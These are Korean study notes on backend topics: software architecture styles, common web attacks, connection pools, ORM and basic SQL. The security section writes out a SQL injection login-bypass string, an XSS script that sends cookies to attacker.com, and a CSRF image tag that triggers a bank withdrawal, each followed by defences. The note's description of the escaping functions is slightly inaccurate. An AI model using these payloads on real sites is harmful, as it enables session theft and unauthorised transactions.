- 3계층 아키텍처 이외에 어떤 아키텍처들이 있을까?

  ### 3계층 아키텍처의 한계

  프로젝트가 커지고 비즈니스 로직이 복잡해지면 **Service에 너무 많은 로직이 몰리는 문제**가 발생할 수 있음

  또한 Service나 도메인 로직이 Repository, 외부 API 같은 기술에 강하게 의존하면 DB나 외부 기술을 변경할 때 핵심 로직까지 영향을 받을 수 있음

  → 프로젝트의 규모나 특징에 따라 다른 구조를 사용하기도 함

  ## Hexagonal Architecture

  **비즈니스 로직을 중심에 두고 DB, 외부 API 등의 기술을 바깥쪽으로 분리**하는 구조

  Ports and Adapters Architecture라고도 함

    ```
    HTTP 요청
       ↓
    Controller
    (Inbound Adapter)
       ↓
    **Input Port**
       ↓
    Application Service
       ↓
    **Output Port**
       ↓
    Repository Adapter
       ↓
    DB
    ```

  핵심 로직이 직접 JPA나 MySQL 같은 기술에 의존하지 않고 **Port라는 인터페이스를 통해 외부와 연결**

  예를 들어 결제 시스템에서

    ```
    PaymentService
           ↓
    PaymentPort
           ↓
    TossPaymentAdapter
    ```

  구조를 사용하면 결제 업체가 변경되더라도 핵심 결제 로직의 변경을 줄일 수 있음

  ### 실제로 사용되는 경우

    - 외부 API 연동이 많은 서비스
    - DB나 외부 기술이 변경될 가능성이 있는 서비스
    - 비즈니스 로직과 인프라 코드를 명확하게 분리하고 싶은 경우
    - 테스트에서 DB나 외부 API를 쉽게 교체해야 하는 경우

  다만 단순한 CRUD 프로젝트에 적용하면 인터페이스와 클래스가 많이 생겨 **구조가 필요 이상으로 복잡해질 수 있음**
    
  ---

  ## Clean Architecture

  핵심 **비즈니스 규칙과 도메인을 가장 중심에 두고 외부 기술에 대한 의존성을 줄이는 구조**

    ```
    HTTP 요청
       ↓
    Controller
    (Presentation)
       ↓
    UseCase / Service
    (Application)
       ↓
    **Domain
    (Entity, 비즈니스 규칙)**
    
    Repository 구현체, DB, 외부 API
    (Infrastructure)
       ↑
    바깥쪽에서 필요한 기능을 연결
    ```

    - **Presentation**
        - 사용자의 요청을 받는 부분
        - Controller가 대표적
        - HTTP 요청을 Application 계층에 전달
    - **Application**
        - 실제 기능의 흐름을 처리
        - 예: 회원가입, 주문하기, 결제하기
        - Service가 위치함
    - **Domain**
        - 가장 핵심적인 비즈니스 규칙을 담당
        - Entity, 도메인 규칙 등이 위치함
        - DB나 Spring 같은 외부 기술을 몰라도 동작할 수 있도록 작성
    - **Infrastructure**
        - DB, JPA, 외부 API처럼 실제 기술을 담당
        - Repository 구현체나 외부 API Client 등이 위치함
        - 핵심 로직을 지원하는 역할

  중요한 특징은 **의존성의 방향이 핵심 비즈니스 로직을 향하도록 설계한다는 것**

  예를 들어

    ```
    OrderController
          ↓
    CreateOrderUseCase
          ↓
    **Order
    (주문 관련 핵심 규칙)**
          ↓
    OrderRepository 인터페이스
    
    JpaOrderRepository
          ↓
    MySQL
    ```

  처럼 구성할 수 있음

  금융 서비스처럼 대출 가능 여부 판단, 이자 계산, 한도 계산 같은 핵심 규칙이 복잡하다면
  이러한 로직을 Controller나 Repository와 분리해서 관리하는 것

  ### 실제로 사용되는 경우

    - 비즈니스 규칙이 복잡한 서비스
    - 오랫동안 유지보수해야 하는 프로젝트
    - 핵심 로직을 Spring, DB 등의 기술과 최대한 분리하고 싶은 경우
    - 테스트가 중요한 프로젝트

  다만 계층과 인터페이스가 많아질 수 있어서 **작은 프로젝트에서는 오히려 개발 복잡도가 증가할 수 있음**
    
  ---

  ## Modular Monolith

  내부를 **여러 개의 독립적인 도메인 모듈로 분리**하는 방식

    ```
    shopping-app
    
    ├─ member
    │  ├─ controller
    │  ├─ service
    │  └─ repository
    │
    ├─ order
    │  ├─ controller
    │  ├─ service
    │  └─ repository
    │
    ├─ payment
    │  ├─ controller
    │  ├─ service
    │  └─ repository
    │
    └─ product
       ├─ controller
       ├─ service
       └─ repository
    ```

  Microservice처럼 각각의 서버로 완전히 분리하지 않고 **하나의 프로젝트 안에서 모듈 경계를 명확하게 구분**

  각 모듈 내부에서는 다시

    - Controller
    - Service
    - Repository

  구조를 사용할 수도 있음

  ### 실제로 사용되는 경우

    - 서비스 규모가 커지고 있지만 아직 Microservice까지 분리할 필요는 없는 경우
    - 회원, 주문, 결제처럼 도메인을 명확하게 나눌 수 있는 서비스
    - 하나의 서버로 관리하면서 코드 간 결합도를 줄이고 싶은 경우

  Microservice보다 배포와 운영은 단순하면서도 기능별 경계를 만들 수 있다는 장점이 있음

- SQL Injection을 포함한 대표적인 웹 보안 공격 기법

  ## SQL Injection

  개발자가 의도하지 않은 방법을 통해 악의적인 sql 쿼리문을 서버로 보내는 공격

  → DB에 마음대로 접근해서 데이터를 빼낼 수 있음

  ### 작동 방식

  사용자가 사용자 이름을 admin, 비밀번호를 passwd123을 입력한다고 가정하고,
  로그인 버튼을 클릭하면 SQL 쿼리가 아래와 같이 실행될 때

    ```sql
    SELECT Count(*) FROM Users WHERE Username=' admin ' AND Password=' passwd123 ';
    ```

  만약 해커가 **사용자 이름: *admin* 비밀번호: *anything 'or'1'='1*** 로 로그인을 시도한다면

    ```sql
    SELECT Count(*) FROM Users WHERE Username=' admin ' AND Password=' anything 'or'1'='1 ' ;
    ```

  위 쿼리가 실행되고 해당 쿼리에서

  `Password=' anything 'or'1'='1';`

  를 보면 password=’anything’ 은 False지만 ‘1’ = ‘1’은 참이 되어서 True 이고
  or연산자로 묶여있어서 true가 되어 비밀번호를 알지 못해도 로그인이 되는 문제가 발생합니다

  SQL Injection은 이런 방식으로 우회하여 db를 손상시킵니다

  ### 대응 방안

    - 사용자 자격 증명하는 쿼리 실행 전에 입력 값 검증하기

        ```sql
        $id = $_GET['id']
        
        (1) $id = Stripslashes($id)
        
        (2) $id = mysql_real_escape_String($id)
        ```

      (1) → `‘` 를  `“` 로 변환

      (2) → `‘`  앞에 `/` 추가

    - Prepared Statement 사용
        - 일반적인 SQL 쿼리와 달리, **쿼리 구조와 값(파라미터)을 분리**하여 실행

        ```sql
        String sql = "SELECT * FROM users WHERE username = ?";
        PreparedStatement pstmt = connection.prepareStatement(sql);
        pstmt.setString(1, userInput);
        ResultSet rs = pstmt.executeQuery();
        ```

    - ORM 사용 → 내부적으로 Prepared Statement 사용

  ## XSS (Cross-Site Scripting)

  클라이언트가 서버를 신뢰해서 발생하는 보안 이슈

  공격자가 웹사이트에 악성 클라이언트 사이드 코드를 삽입할 수 있도록 하는 보안 취약점 공격으로 악성 코드는 피해자에 의해 실행되며 공격자가 접근 제어를 우회하고 사용자로 위장할 수 있게 만들어줌

  ### 작동 방식

  해커가 다음과 같은 악성 스크립트를 댓글에 입력한다면

    ```sql
    <script>
        document.location='http://attacker.com/steal?cookie=' + document.cookie;
    </script>
    ```

  이 댓글이 다른 사용자에게 표시되면, 사용자의 쿠키가 attacker.com으로 전송
  해커는 세션 쿠키를 탈취하여 피해자 계정에 접근 가능

  위처럼 서버에 요청하고 응답을 받는 과정을 이용해서 공격자가 게시판이나 메일 등에 스크립트 코드를 작성하고 이를 다른 사용자가 해당 코드를 request로 전송을 하고 response도 그대로 받아서
  악성코드가 실행되게 되는 문제

  ### 대응 방안

    - 특수 문자 이스케이프 처리
        - 사용자가 입력한 `<`, `>`, `"`, `'` 같은 문자를 **HTML 코드로 실행되지 않고 그냥 글자로 보이도록 바꾸는 것**
    - **CSP (Content Security Policy) 적용**
        - 웹사이트에서 **어떤 스크립트를 실행할 수 있는지 브라우저에 미리 제한을 거는 보안 설정**
    - **HTTP Only 쿠키 설정**
        - 쿠키를 **자바스크립트에서 직접 읽지 못하도록 설정하는 것**
        - XSS가 발생하더라도 공격자가 document.cookie 등을 이용해 로그인 쿠키를 훔치는 위험을 줄일 수 있음

  ## CSRF (Cross-Site Request Forgery)

  XSS와 반대로 서버가 클라이언트를 신뢰해서 벌어지는 보안 이슈

  사용자가 **로그인된 상태에서** 공격자가 강제 요청을 보내 사용자 대신 특정 작업을 수행하게 하는 공격

  ### 작동 방식

  사용자가 은행 사이트에 로그인한 상태에서, 해커가 다음과 같은 실제 이미지가 아닌 이미지를 삽입

  이 이미지는 은행 서버에 돈을 인출하라는 요청을 src에 담고 있음

    ```sql
    <img
      src="https://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory" />
    ```

  은행 계좌에 로그인되어 있고, 쿠키가 여전히 유효한 경우라면(다른 확인이 없는 경우) 이 이미지가 포함된 HTML을 로드하는 즉시 송금이 진행됨

  ### 대응 방안

    - **CSRF Token 사용**
        - 서버가 만든 임의의 토큰을 요청에 같이 보내고, 올바른 토큰인지 확인
        - 공격자가 사용자의 요청을 대신 보내는 것을 막을 수 있음
    - **SameSite Cookie 설정**
        - 다른 사이트에서 요청할 때 로그인 쿠키가 자동으로 전송되지 않도록 제한
        - 외부 사이트를 통한 요청 위조를 줄일 수 있음
    - **Origin / Referer 확인**
        - 요청이 우리 사이트에서 온 것인지 확인
        - 다른 사이트에서 보낸 요청이면 차단
    - **GET으로 데이터 변경하지 않기**
        - GET은 조회에만 사용
        - 수정·삭제 같은 작업은 POST, PUT, DELETE 등을 사용

  ### 기타

    - MitM: 사용자와 서버 사이에 공격자가 끼어들어 **통신 내용을 몰래 확인하거나 변조하는 공격**
        - ex) 공용 wifi를 통한 공격
    - 세션 하이재킹: 공격자가 사용자의 **세션 ID나 세션 쿠키를 탈취하여 해당 사용자처럼 로그인하는 공격**
- 커넥션 풀(Connection Pool)이란?

  ## Connection Pool

  ### 사용 배경

  애플리케이션이 DB에 쿼리를 날리려면 **Connection** 객체를 생성해야 한다

  하지만 Connection 객체는 한 번 사용하면 닫아야 하며
  DB 연결할 때마다 Connection 객체를 새로 만드는 것은 비용이 많이 들기 때문에 비효율적이다

  위 문제를 해결하기 위해 요청이 들어오면 새로운 연결을 만드는 대신
  **Connection을 미리 여러 개 준비해 놓은 Connection Pool을 사용하는 방식**이 등장하게 된다

  ### 동작 구조

    1. 애플리케이션이 시작되면 **커넥션 풀이 DB와 연결된 Connection을 일정 개수 미리 생성하여 보관**한다.
    2. 풀에 있는 Connection은 이미 **TCP/IP를 통해 DB와 연결된 상태**이므로, 요청이 들어왔을 때 새로운 연결을 만드는 과정 없이 바로 사용할 수 있다.
    3. 애플리케이션에서 DB 작업이 필요하면 새로운 Connection을 직접 생성하는 것이 아니라 **커넥션 풀에 있는 Connection을 빌려서 사용**한다.
    4. 커넥션을 요청하면 커넥션 풀은 현재 사용되지 않는 Connection 중 하나를 애플리케이션에 전달한다.
    5. 애플리케이션은 빌린 Connection을 사용하여 **SQL을 DB에 전달하고 결과를 처리**한다.
    6. DB 작업이 끝나면 Connection을 실제로 종료하지 않고 **커넥션 풀에 다시 반환**한다.
    7. 반환된 Connection은 DB와의 연결을 유지한 상태로 대기하다가 **다음 요청에서 다시 재사용**된다.
    8. 만약 풀의 모든 Connection이 사용 중이라면 새로운 요청은 **Connection이 반환될 때까지 대기**하며, 일정 시간 안에 얻지 못하면 오류가 발생할 수 있다.

  ### 종류

  | 종류 | 특징 |
      | --- | --- |
  | **HikariCP** | 빠르고 가벼움, Spring Boot에서 기본적으로 많이 사용 |
  | **Apache DBCP2** | Apache에서 제공하는 대표적인 커넥션 풀 |
  | **C3P0** | 과거 Java 프로젝트에서 많이 사용 |

  구현이 간단해서 직접 구현도 가능

  ### 사용 방법

  일반적으로 개발자가 직접 커넥션을 생성하고 관리하지 않고 **커넥션 풀 라이브러리**가 대신 관리

  Spring Boot에서는 보통 **DataSource**를 통해 커넥션 풀을 사용

  여기서 DataSource는 커넥션을 얻기 위한 **인터페이스**이고
  실제로 커넥션 풀을 관리하는 구현체로 **HikariCP**가 주로 사용된다

    ```sql
    Connection connection = dataSource.getConnection();
    
    // SQL 실행
    
    connection.close();
    ```

  여기서 close()는 실제 DB 연결을 종료하는 것이 아니라 **사용한 커넥션을 커넥션 풀에 반환하는 역할**

  ### 설정

    - maximumPoolSize
        - 커넥션 풀에서 사용할 수 있는 **최대 커넥션 개수**
        - 예를 들어 10으로 설정하면 동시에 최대 10개의 커넥션을 사용할 수 있다.
    - minimumIdle
        - 사용하지 않더라도 풀에서 미리 유지해 두는 **최소 대기 커넥션 수**
        - 요청이 들어왔을 때 바로 사용할 수 있도록 일정 수의 커넥션을 준비해 둔다.
    - connectionTimeout
        - 사용 가능한 커넥션이 없을 때 **커넥션을 얻기 위해 기다리는 최대 시간**
        - 이 시간을 초과하면 커넥션을 얻지 못했다는 예외가 발생할 수 있다.

    ```sql
    spring:
      datasource:
        hikari:
          maximum-pool-size: 10
          minimum-idle: 5
          connection-timeout: 30000
    ```

- Raw SQL vs ORM

  **Raw SQL**: SQL을 직접 작성하는 방식 자체

  ## ORM**(Object Relational Mapping)**

  db 테이블과 클래스를 매핑 → **SQL문을 개발자가 직접 작성하지 않고 코드로 db를 조작**

    - 객체와 관계형 데이터베이스의 데이터를 연결해주는 기술
    - Java의 객체와 DB의 테이블 구조가 서로 다르기 때문에, ORM이 둘 사이를 매핑해준다

  ### 필요한 이유

    ```sql
    ResultSet rs = statement.executeQuery(
        "SELECT * FROM users WHERE id = 1"
    );
    
    if (rs.next()) {
        User user = new User();
    
        user.setId(rs.getLong("id"));
        user.setName(rs.getString("name"));
        user.setAge(rs.getInt("age"));
    }
    ```

  ORM이 없다면 db의 값을 객체에 넣고 싶다면 위의 방식으로 해야함

  → ORM을 사용한다면 이러한 변환 작업을 ORM이 처리해주고 개발자는 밑처럼 간단한 코드 작성!

    ```sql
    **User user = userRepository.findById(1L);**
    ```

  ORM의 목적은
  **SQL을 완전히 없애는 것이 아니라DB 데이터를 객체로 바꾸고 관리하는 반복 작업을 줄이는 것**

  ### 장점

    - **반복적인 CRUD 코드 감소**
        - SELECT, INSERT, UPDATE, DELETE 등의 SQL을 매번 직접 작성하는 작업을 줄일 수 있다.
    - **객체지향적인 코드 작성 가능**
        - SQL 중심이 아니라 객체와 메서드를 중심으로 DB를 다룰 수 있다.
        - 개발자가 비즈니스 로직에 더 집중할 수 있다.
    - **DB 데이터를 객체로 변환하는 작업 감소**
        - 조회한 데이터를 개발자가 직접 객체에 하나씩 넣어주는 작업을 줄일 수 있다.
    - **코드의 가독성과 생산성 향상**
        - DB 처리 코드가 줄어들어 전체 코드가 비교적 간결해진다.
    - **유지보수와 재사용이 편리**
        - 객체와 DB 사이의 매핑 정보가 정리되어 있어 코드 변경이나 재사용이 비교적 쉽다.
    - **DBMS에 대한 종속성 감소**
        - ORM이 DB와 애플리케이션 사이에서 동작하기 때문에 특정 DBMS에 직접 의존하는 코드를 줄일 수 있다.
        - 따라서 DBMS를 변경해야 하는 경우에도 SQL을 전부 다시 작성해야 하는 부담을 어느 정도 줄일 수 있다.

  예를 들어 SQL을 직접 작성하면

    ```sql
    INSERT INTO users(name, age)
    VALUES ('수빈', 21);
    ```

  ORM에서는 객체를 저장하는 방식으로 사용할 수 있다.

    ```java
    User user = new User("수빈", 21);
    
    userRepository.save(user);
    ```

  ### ORM의 단점

    - **ORM 자체에 대한 학습이 필요**
        - 객체와 테이블의 매핑 방식, 연관관계, 영속성 등의 개념을 추가로 알아야 한다.
    - **ORM이 생성한 SQL을 이해해야 함**
        - ORM이 SQL을 자동으로 생성한다고 해서 SQL을 몰라도 되는 것은 아니고
        - 잘못 사용하면 불필요한 쿼리가 많이 실행되거나 성능이 저하될 수 있다.
    - **복잡한 쿼리에는 불편할 수 있음**
        - 여러 테이블을 JOIN하거나 복잡한 통계·집계 쿼리를 작성해야 한다면 직접 SQL을 작성하는 것이 더 간단할 수 있다.
    - **세밀한 성능 최적화가 어려울 수 있음**
        - ORM이 자동으로 만들어주는 SQL이 항상 가장 효율적인 것은 아니다.
        - 성능이 중요한 쿼리는 직접 SQL을 작성하거나 별도의 튜닝이 필요할 수 있다.

  ### 대표적인 ORM

    - Java
        - JPA
        - Hibernate
    - Python
        - SQLAlchemy
    - .NET
        - Entity Framework

  Spring에서는 보통 **JPA를 사용하고, 실제 구현체로 Hibernate를 사용한다**

- INSERT 외에 데이터를 다루는 핵심 SQL 문법

  SQL에서 데이터를 직접 다룰 때 주로 사용하는 문법은 **SELECT, INSERT, UPDATE, DELETE**이다.

  이 네 가지는 CRUD와 연결해서 이해할 수 있다.

  | CRUD | SQL | 역할 |
      | --- | --- | --- |
  | Create | INSERT | 데이터 추가 |
  | Read | SELECT | 데이터 조회 |
  | Update | UPDATE | 데이터 수정 |
  | Delete | DELETE | 데이터 삭제 |

  ## SELECT

  테이블에 저장된 데이터를 **조회**할 때 사용한다.

    ```sql
    SELECT *
    FROM users;
    ```

  특정 조건의 데이터만 조회하려면 WHERE을 함께 사용한다.

    ```sql
    SELECT *
    FROM users
    WHERE user_id = 1;
    ```

  ## INSERT

  테이블에 새로운 데이터를 **추가**할 때 사용한다.

    ```sql
    INSERT INTO users (nickname)
    VALUES ('빈');
    ```

  ## UPDATE

  이미 존재하는 데이터를 **수정**할 때 사용한다.

    ```sql
    UPDATE users
    SET nickname = '수빈'
    WHERE user_id = 1;
    ```

    - SET : 변경할 값을 지정
    - WHERE : 수정할 데이터를 지정
    - WHERE을 생략하면 **모든 행이 수정될 수 있으므로 주의**

  ## DELETE

  테이블에 존재하는 데이터를 **삭제**할 때 사용한다.

    ```sql
    DELETE FROM users
    WHERE user_id = 1;
    ```

    - WHERE을 생략하면 **테이블의 모든 데이터가 삭제될 수 있으므로 주의**

  ## 함께 자주 사용하는 문법

  데이터를 조회할 때는 다음 문법도 자주 함께 사용한다.

    - WHERE : 조건에 맞는 데이터만 조회
    - ORDER BY : 데이터를 정렬
    - GROUP BY : 특정 기준으로 데이터를 그룹화
    - HAVING : 그룹화된 데이터에 조건 적용
    - JOIN : 여러 테이블의 데이터를 연결
    - LIMIT : 조회할 데이터 개수 제한

    ```sql
    SELECT *
    FROM book
    WHERE is_available = TRUE
    ORDER BY book_id DESC
    LIMIT 10;
    ```

  ### SQL 실행 순서

  작성 순서와 실제 처리 순서는 다르다.

    ```
    FROM
    → WHERE
    → GROUP BY
    → HAVING
    → SELECT
    → ORDER BY
    → LIMIT
    ```
    
  ---

  ### 트랜잭션

  여러 SQL을 하나의 작업처럼 처리할 때 사용한다.

    ```sql
    START TRANSACTION;
    
    UPDATE account
    SET balance = balance - 10000
    WHERE user_id = 1;
    
    UPDATE account
    SET balance = balance + 10000
    WHERE user_id = 2;
    
    COMMIT;
    ```

    - COMMIT : 변경사항 확정
    - ROLLBACK : 변경사항 취소

  계좌 이체처럼 여러 작업이 모두 성공해야 하는 경우에 사용